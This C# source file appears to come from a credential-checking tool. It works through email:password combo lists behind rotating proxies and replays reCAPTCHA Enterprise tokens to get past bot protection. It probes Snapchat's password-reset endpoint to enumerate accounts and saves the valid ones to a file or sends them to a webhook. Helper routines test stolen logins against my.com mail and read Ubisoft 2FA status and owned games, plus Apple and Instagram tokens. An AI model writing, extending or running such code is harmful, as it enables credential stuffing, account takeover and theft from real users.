using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class snapchatvmkek
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!snapchatvmcheck.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (snapchatvmcheck.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = snapchatvmcheck.RandomProxies();
								var res0 = httpRequest.Get("https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=T9w1ROdplctW2nVKvNJYXH8o&size=invisible&badge=inline&cb=fdz7fsng5qkm");
								string text0 = res0.ToString();

								var token = Functions.LR(text0, "<input type=\"hidden\" id=\"recaptcha-token\" value=\"", "\">").FirstOrDefault();

								var res1 = httpRequest.Post("https://www.google.com/recaptcha/enterprise/reload?k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw", "v=T9w1ROdplctW2nVKvNJYXH8o&reason=q&c=" + token + "&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&size=invisible&chr=%5B96%2C10%2C74%5D%22&vh=-17302517492&bg=!j4mgiaDIAAWoGLRLqEc8VEkdHbArfV2UJEQRIYLsCQcAAAE4VwAAACCcCenSgCz554HJdd_dwHoiDTxV8O6QgPP3pl4LmqfftCtTENNQoTmBqEXMc-k5uPSX50fmvFqghofq-0Ltte0OMyIgPkrtkmtsHMcZPjPrAB5XNPu8873HXE7Tycf_YgDXn0lUG6ZMbsxftGGyam5zPuHWdmIjBnhpMLTfdYuO4YhL6IIoJoArKF6D2zzOCm-x4k6vB7UuPAJyU7IsqWHCrMBV_tqrCFgarT-8GkYmwpEMRHZj98oqrfyv9QeYSN76YgYXw9qQEK-dGAse6hIdX8jylF8rXKiKLQzBHXZns10cpjm2H1rTX_IkJ1SiszKpn5YiDGeSJsSbG4Lgxss7ODk0r1nod6dLC4GyBGi87CnFeJV6Nyzt0x2_q7O8xyje9LQ1wYtygQ8WudqkvbeYomg9R2ABmBZDbygPLPmfi1LE-sGuMWPA8eRvylDLanxWg7e4rP08nEIjcTMsJ9IuzaJM3WasSHof0qbq-kQgGCLf7YugSZr70nj5OuEmkg4NjXTczZAZF2bXiRBvEWc-WMjD08Rtu3W31GWnTTG4463kZM0QOj6WvwD3NHM3JjZfFMaee-0i23T8JGpDPvWxafDuJYbfETS2PxWaaPF7jImMGjkkW7o0uP-WyYcCkydiJwgZb8yF3SSom773rARhphBeB2yFuY8gQlgid8ahxGkCbr52leTUkKlYLFZR1ldnsgxFTkRrmDw39aTAkCxnsY6MhjOmxrN9BpwieoAQXrkTJmUYIJnDfx1PzT6KK0wq1dsAc3gzrHlEttrcXDeNUe6tZFA3xNkY9IWZ_Y-w_dxg9AmjnBfJcqDW-iJwdLzPxt4DkjF3GNPBqvMf6eCQ4h0mOsEyUlPaECxjFmzaYZbka15KTUFSj9FgPF13wZV9OffPSSve0YxJ2FkIilY6gg9bEsvoQa51sEbytLhPYgbNxuugoprg8AkG0q_C9JZn-cfLD1CtDVkjSRdb387_RrDJPocyJV8I6OO7V_tcME3N_lkHDg6wVYj9bCPD9add5TVoH9kWsyfu-_O42V9oOYHIt0-LWFNGRBmxkP81tGM5kdBo3mqJbJCIcdCT3n_VVWzitJe4KPl6lGdNxwHY7EB9KPneyntH2Saap6Iq3pp6dMLUmle8IoKtdvDNaufC-LoVQYN4CaHTIeE8GPmQUYPH28L30nzfx-zrXrv89bKBkpEBrDZiYixN1W_NlzhHLSa02gRaDsrctdy43O4VeKO5vmMqjTZ6lzX0hV64rweKS6zAbjtWlg7F3TeLMfyNHi7CUp4yHfPOXJ40q81zgdXqY3huaxHQFM2uC7mgl8zRYLBCox0ogBmP1YtuYJpE3yl-w_RDLKQ-ONiCotm_im-z0vRGxiYdKA93TFqjFi9FV32Xz_yV7xq4D0RqHAucCmtFWouEACXiY-wcn37yclcL1ecADsJFV_e73iLfRySSrs-WmViTLk74NY_MF-q0Rspt1eKZPUupfwCiCJMpxbHhl1uRG9aBiMbB8Ms3A7GLatDk4OJ_0TSID3M33iniinss0xeNl-qEMeiax1bbDzy1ptyfH0n5JRdD282GrbD9lFXxDqljCexiB--Gv6EURJAKtdjYCq3tMiaIRMkM1xIdQawYJhOrHWPa0X_3tha595g5N7hYplnXHrd8PnFPkrzW5CDC9_mEpQLfUzvXGFP7QT-pf_KSpnWZI04idSXgGjkk-Yhd02p-S14NiK0OEC-eHo4ruwKDQav5iQbDRvwo8KJJlLI0F1rLtW-g_MI27KA2O95r2EiW_7EDiwB_BK1s4czdYnA9y7z9--qIeED-EfuQfFMO0uweIDd7O1IjwqilOOBMKJtsMXKwZm1vbJw20kcNZAomlyEHmvzHy4VAmwL0icQDs-u3ZwiLKxNgOxIf1aLk-eR0PncO-laSkGSTrf9yHXacghnn4Mn1K5nE6yqEqREIo4qxd_C0b8FxMz96Mo3VcN-0_VLMLw08qv_YynT0GgGHGjvOFx7R53d6YsWjykN6_DiSx8QUXa9q2o3NUgkb10vh038Fn4EpO7a1MFG7g14ne6251_xoGopOasnVtw8DYSDaDJdGHjjk_NVdlFOHHwN5d66_8bQn05gUnhAi1JzZCC9YXky9xqyEdfcgs-LE0CzNuA-KwKs7gR7LclAsAfaJo-ARtgdDlAyMrX2JF9Sjqu3CSC4l0cPc0gkhOS24yofwUqEeL1JBwUHn3cC8ke0xOeD7wk40kMnsEQN-VaCM5-wxs2VQt8-wClEd-3RX30fsPOVS7ZzdCAjsJQidPufZVj7gGGGlqRWZLfxf6G6NMK_5PoEWN2bG1byFZo6-NT6szNeqW3Nz0Swf-tFHsfr3TDb5LaxfuAXucRn2IQ6bjABdRR5lq4hdYNj2KYfq6qMb21pOHcNYrY185DSPOrMwsq71hg9b-XXSLwDVHj0jBFdtB_N9M1hc9q_bRTQw9aQvg_M2LtgQeKS77rTcsxYL0FUHEkOEDKHCaTuVFhshhPN3enFu97d6pyN41fr_QKzgmjkYqsx1SgAq8dQ8cCa63U7e9FOh3riKyAkW7_NuQss1vhJ4UJ8BBzot2JJSfLCjorUDJgri2dI3I3FIaLKPiu17Lc3FZmV0VX-S66L4NRsRnmrZFMBH6-ou8BCQDYh0BD41NjhIIPKqOdx0mPmI1UMGZlg8-UQP08wUqxha9Sg34AH0EmZUszfDXpFwgChLv5wvzcxaN6YSTjekWCLRWPTW7B6xg3h0NnCNsJ8lVp88jKVF9MEtgRTPwFH1aWUHD6p6GYI2iogNrVf7RdzK24I7tJjqRNCuBbYAB1FfLgKZGzc6pREo9PiLQFXi_l4C6CJtsZOHKWlMNMmzH3hrTwmYowvdZ023uUOJzBPgHJeodjBqo0EiHJOAs_mGw90mB6DGa6ELGUAL5snewusDDXtw1G7C_bhsUXMJ1pY40vUSINAiG5PcPkLcfBQHqvaaiY06hUjDoHMmMbjkXACkcm7wdcIXwI6iS0RtrGULUBX3OvLzrU2LHVqQYmGwXv9N-R7H-lmBxK1Iac5TLqi8ysIT8HfiOmn-CK0dmPIoZedjAOQe-92nG2MXjqMNTNGwCNipT6NbaN1p01r0eTFAmYS2OVrldwG_6ZyuitVKtncORLc5dNphQc9qixTEJPZhNUt3tcRkyBmPBE1VDCdaSYZMdr6JJtmbN512vgy4vXSCoDzC6DjPsqkZc1MGxYveAtih8fodSAKr-SgLgPpLq5jlDomz90QRqLDPIgr719zndszNoWCAgNu2gYHwqI1GZ1h3JdcDSCoC5ecFJMbMypl9rnj4K4RdGi7Ri1vmKsFesovmpwpnn8XC3HJx9xmk7oXlTVl7uMVVZ_LhurV1bQ*", "application/x-www-form-urlencoded");
								string text1 = res1.ToString();

								var rresp = Functions.LR(text1, "[\"rresp\",\"", "\",").FirstOrDefault();

								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");

								var res2 = httpRequest.Get("https://accounts.snapchat.com/accounts/password_reset_request");
								string text2 = res2.ToString();

								var TOKEN = Functions.LR(text2, "xsrf=\"", "\"").FirstOrDefault();



								var res3 = httpRequest.Post("https://accounts.snapchat.com/accounts/password_reset_request", "emailaddress=" + email + "&xsrf_token=" + TOKEN + "&g-recaptcha-response=" + rresp + "&g-recaptcha-response=" + rresp + "", "application/x-www-form-urlencoded");
								string text3 = res3.ToString();

								if (text3.Contains("Email Sent &bull; Snapchat"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref snapchatvmcheck.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref snapchatvmcheck.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref snapchatvmcheck.Hits); Interlocked.Increment(ref stats.hits);
										if (Program.config.showgood == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
										}
										if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
									}
									break;
		


								}
								else if (text3.Contains("Email address is invalid."))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref snapchatvmcheck.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref snapchatvmcheck.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref snapchatvmcheck.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showbad == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else
								{
									string acc1 = email + ":" + password;
									snapchatvmcheck.Combo.Enqueue(acc1);
									Interlocked.Increment(ref snapchatvmcheck.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								snapchatvmcheck.Combo.Enqueue(acc1);
								Interlocked.Increment(ref snapchatvmcheck.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = snapchatvmcheck.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref snapchatvmcheck.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = snapchatvmcheck.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref snapchatvmcheck.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = snapchatvmcheck.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = snapchatvmcheck.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					snapchatvmcheck.Combo.Enqueue(acc1);
					Interlocked.Increment(ref snapchatvmcheck.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = snapchatvmcheck.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref snapchatvmcheck.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
